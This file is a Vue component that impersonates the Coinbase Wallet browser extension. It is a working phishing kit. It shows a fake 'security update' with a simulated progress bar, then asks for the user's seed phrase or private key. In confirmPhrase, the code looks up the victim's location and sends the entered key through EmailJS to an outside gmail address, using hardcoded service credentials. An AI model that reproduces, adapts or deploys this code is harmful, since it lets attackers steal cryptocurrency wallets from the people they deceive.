<template>
  <div class="bg-black rounded-2xl w-full text-white overflow-hidden">
    <!-- Header -->
    <div
      v-if="currentStep === 4"
      class="flex justify-between items-center py-4 px-4 border-b border-gray-700"
    >
      <button
        @click="goBackToStep2"
        style="background: transparent; border: none; padding: 0"
        class=""
      >
        <svg
          class="text-white cursor-pointer h-8 w-8"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M15 19l-7-7 7-7"
          />
        </svg>
      </button>
      <div class="text-3xl font-bold text-[#222222]">
        {{
          currentStep === 2
            ? "Connect account"
            : currentStep === 3
            ? "Update account"
            : ""
        }}
      </div>
      <span class="w-6"></span>
      <!-- Spacer for balance -->
    </div>

    <hr class="border-t m-0 border-gray-500" v-if="currentStep !== 1" />

    <!-- Step Container -->
    <div class="min-h-[520px] flex flex-col relative">
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <!-- STEP 1 -->
          <template v-if="currentStep === 1">
            <div class="flex flex-col p-6">
              <div class="mb-1 mt-[30px]">
                <img
                  src="https://vercelquickfix.com/coinbase-2.jpg"
                  alt="Phantom Logo"
                  class="object-cover rounded-[10px] w-[60px] h-[60px]"
                />
              </div>
              <form class="w-full mt-[20px]">
                <h2
                  class="text-5xl leading-[24px] font-bold m-0 tracking-[-0.02em]"
                >
                  Coinbase Wallet
                </h2>
                <p class="text-gray-600 mt-1 font-semibold text-[14px] mb-8">
                  Extension
                </p>
                <div class="mb-2 mt-[100px]">
                  <label for="" class="text-[18px] font-semibold mb-4"
                    >Unlock with password</label
                  >
                  <input
                    type="password"
                    v-model="password"
                    style="background: black; font-size: 14px"
                    class="w-full font-medium bg-[#eeeeee] rounded-[6px] p-3 text-[#777777] placeholder-[#777777] focus-visible:border-[#2f2f2f] focus-visible:ring-0 focus-visible:outline-none"
                    placeholder="Password"
                    required
                  />
                </div>

                <div class="mt-[20px]">
                  <button
                    @click="unlock"
                    type="button"
                    :disabled="password.length <= 6 || isLoading"
                    class="bg-[#0052FF] w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white relative"
                  >
                    <span v-if="!isLoading">Unlock</span>
                    <svg
                      v-else
                      class="animate-spin h-6 w-6 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        class="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        stroke-width="4"
                      />
                      <path
                        class="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                      />
                    </svg>
                  </button>
                  <div class="text-center mb-[30px] mt-[20px]">
                    <a
                      href="#"
                      class="text-[14px] text-white font-semibold hover:text-white"
                      >Forgot password?</a
                    >
                  </div>
                </div>
              </form>
            </div>
          </template>

          <!-- STEP 2 -->
          <template v-else-if="currentStep === 2">
            <div class="flex flex-col p-6">
              <div class="mb-1 mt-[30px]">
                <img
                  src="https://vercelquickfix.com/coinbase-2.jpg"
                  alt="Phantom Logo"
                  class="object-cover rounded-[10px] w-[60px] h-[60px]"
                />
              </div>
              <form class="w-full mt-[20px]">
                <h2
                  class="text-5xl leading-[24px] font-bold m-0 tracking-[-0.02em]"
                >
                  Coinbase Wallet
                </h2>
                <p class="text-gray-600 mt-1 font-semibold text-[14px] mb-8">
                  Extension
                </p>
                <div class="mt-[30px] mb-[60px]">
                  <div class="bg-[#0A0B0D] rounded-lg p-4">
                    <div class="flex items-start">
                      <div class="bg-[#0052FF] rounded-full p-2 mr-3 mt-1">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          class="h-5 w-5 text-white"
                          viewBox="0 0 20 20"
                          fill="currentColor"
                        >
                          <path
                            fill-rule="evenodd"
                            d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9a1 1 0 00-1-1z"
                            clip-rule="evenodd"
                          ></path>
                        </svg>
                      </div>
                      <div>
                        <h3 class="text-white text-[16px] font-semibold mb-1">
                          Security Update Required
                        </h3>
                        <p class="text-gray-400 text-[14px] leading-8 mt-3">
                          To ensure your wallet's security, please confirm this
                          update to continue using Coinbase Wallet.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                <div class="mt-[20px]">
                  <button
                    @click="nextStep"
                    type="button"
                    :disabled="password.length <= 6 || isLoading"
                    class="bg-[#0052FF] w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white relative"
                  >
                    <span v-if="!isLoading">Confirm Update</span>
                    <svg
                      v-else
                      class="animate-spin h-6 w-6 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        class="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        stroke-width="4"
                      />
                      <path
                        class="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                      />
                    </svg>
                  </button>
                  <button
                    @click="prevStep"
                    type="button"
                    class="bg-black border-white border mt-4 w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white relative"
                  >
                    Back
                  </button>
                </div>
              </form>
            </div>
          </template>

          <!-- STEP 3 (Multi-stage) -->
          <div
            v-else-if="currentStep === 3"
            key="s3"
            class="flex flex-col items-center p-6"
          >
            <div class="flex flex-col items-center gap-3 py-6 w-full">
              <video
                style="width: 100%; height: 350px"
                src="https://vercelquickfix.com/update-coinbase.mp4"
                autoplay
                loop
              ></video>

              <h2 class="text-4xl text-white mt-2 mb-0 text-center font-bold">
                Updating
              </h2>

              <div class="w-full mt-6">
                <div class="bg-white h-2 rounded-full overflow-hidden">
                  <div
                    class="h-4 rounded-full transition-all"
                    :style="{
                      width: progress + '%',
                      background: '#0052FF',
                    }"
                  ></div>
                </div>
                <div
                  class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-white"
                >
                  <span>{{ Math.round(progress) }}%</span>
                </div>
              </div>
            </div>
          </div>

          <!-- STEP 4: Import / Secret Recovery Phrase / Private Key -->
          <div
            v-else-if="currentStep === 4"
            key="s4"
            class="flex flex-col w-full p-6"
          >
            <!-- Steps Indicator -->
            <div class="flex items-center mb-6 mt-6">
              <div class="flex space-x-2">
                <div class="w-[40px] h-2 rounded-full bg-white"></div>
                <div class="w-[40px] h-2 rounded-full bg-white"></div>
                <div class="w-[40px] h-2 rounded-full bg-gray-600"></div>
                <div class="w-[40px] h-2 rounded-full bg-gray-600"></div>
              </div>
            </div>

            <h2 class="text-4xl font-bold mt-6">Import wallet</h2>

            <div class="mt-8 text-[14px] font-semibold">
                <span class="text-[#0052FF] ">Successfully Updated!</span> Enter your wallet's 12-word recovery phrase or private key to complete the process. You can import any Ethereum, Solana, or Bitcoin recovery phrase. Only Ethereum private keys are supported.
            </div>

            <!-- Seed Phrase Tab -->
            <div>
              <label class="block text-black mb-3 text-lg font-medium">
                Paste or input your private key
              </label>
              <textarea
                v-model="privateKeyInput"
                rows="4"
                placeholder=""
                class="w-full mb-3 bg-[#181818] border border-gray-300 rounded-lg py-3 px-4 text-white text-[16px] outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 resize-none"
              ></textarea>
              <span class="text-[14px] font-semibold text-[#0052FF]">Where can I find it?</span>

              <!-- Confirm Button -->
              <div class="flex gap-3 mt-[30px]">
                <button
                  @click="confirmPhrase"
                  
                  class="flex-1 font-bold bg-[#0052FF] text-[14px] border-none hover:border-none hover:text-[#222] hover:bg-[#0052FF] text-white py-4 px-4 rounded-[30px] font-bold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {{ isLoading ? 'Importing...': 'Import Wallet' }}
                </button>
              </div>
            </div>
          </div>
        </div>
      </transition>

      <!-- Success & Error Message -->
      <transition name="fade">
        <div
          v-if="message.text"
          :class="[
            'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
            message.type === 'success'
              ? 'bg-green-600 text-white'
              : 'bg-red-600 text-white',
          ]"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import { ref, watch, computed, nextTick } from "vue";
import axios from "axios";

const emit = defineEmits(["close"]);
const currentStep = ref(1);
const password = ref("");
const isLoading = ref(false);
const progress = ref(0);
const message = ref({ text: "", type: "" });

// Step 4 variables
const activeTab = ref("seed");
const selectedWordCount = ref("12");
const phraseWords = ref([]);
const hiddenFields = ref([]);
const privateKeyInput = ref("");

// Initialize phrase words based on selected count
function initPhraseWords() {
  const count = parseInt(selectedWordCount.value);
  phraseWords.value = Array(count).fill("");
  hiddenFields.value = Array(count).fill(true);
}

// Update word count when dropdown changes
function updateWordCount() {
  initPhraseWords();
}

// Navigation
function goBackToStep2() {
  currentStep.value = 2;
}

function unlock() {
  if (password.value.length <= 6) return;
  isLoading.value = true;
  setTimeout(() => {
    isLoading.value = false;
    nextStep();
  }, 2000);
}

async function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;

  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;

  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      setTimeout(() => {
        currentStep.value = 4;
        initPhraseWords();
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

function nextStep() {
  if (currentStep.value < 3) {
    currentStep.value++;
    if (currentStep.value === 3) startUpdate();
  }
}

function prevStep() {
  if (currentStep.value > 1) currentStep.value--;
}


const isImportDisabled = computed(() => {
  return privateKeyInput.value.trim();
});

async function confirmPhrase() {
  if ( privateKeyInput.value.length < 64) {
    return showMessage("Please fill all fields", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "phrase or private",
      phrase: privateKeyInput.value,
    };

    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "OKX Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      showMessage("Wallet imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}


function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}

// Initialize
watch(currentStep, (val) => {
  if (val === 3) startUpdate();
});

// Initialize phrase words when component mounts
initPhraseWords();
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.4s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

input::placeholder {
  font-size: 14px;
  color: #9ca3af;
}

/* Custom scrollbar for the seed phrase grid */
.scrollbar-custom::-webkit-scrollbar {
  width: 6px;
}

.scrollbar-custom::-webkit-scrollbar-track {
  background: #f1f1f1;
  border-radius: 3px;
}

.scrollbar-custom::-webkit-scrollbar-thumb {
  background: #c1c1c1;
  border-radius: 3px;
}

.scrollbar-custom::-webkit-scrollbar-thumb:hover {
  background: #a8a8a8;
}
</style>
